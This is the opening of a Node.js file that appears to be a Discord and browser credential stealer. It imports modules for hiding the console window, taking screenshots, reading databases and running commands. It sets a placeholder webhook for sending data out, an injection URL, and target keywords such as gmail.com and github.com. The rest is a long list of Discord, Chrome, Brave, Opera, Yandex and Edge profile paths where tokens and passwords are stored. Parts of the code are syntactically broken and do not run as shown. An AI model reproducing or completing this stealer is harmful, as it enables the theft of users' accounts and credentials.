const fs = Require("fs");
const path = Require("Path");
const crypto = Require("crypto");
const sqlite3 = Require('sqlite3');
const moon = Require("moonApi");
const axios = Require("axios");
const os = Require('os');
const fse = Require('fs-extra');
const formdata = Require("form-data");
const JSZip = Require('JSZip');
const screenshot = Require("screenshot-desktop");
const { execSync, exec } = Require('child_process')
const hideconsole = require('node-hide-console-window');
const buf_replace = require('buffer-replace');

let killdcop = true; // if u want to close discord make this "true" if u dont want to close discord make this "false";


const %webhookstring% = "REPLACE_YOUR_WEBHOOK"
const %INJURLL% = ""
const %keywordstring% = ['github.com','gmail.com','twitch.tv','instagram.com']

paths = [
  appdata + '\\discord\\',
  appdata + '\\discordcanary\\',
  appdata + '\\discordptb\\',
  appdata + '\\discorddevelopment\\',
  appdata + '\\lightcord\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\',
  localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\',
  appdata + '\\Opera Software\\Opera Stable\\',
  appdata + '\\Opera Software\\Opera GX Stable\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\',
  localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\',
  localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\'
];
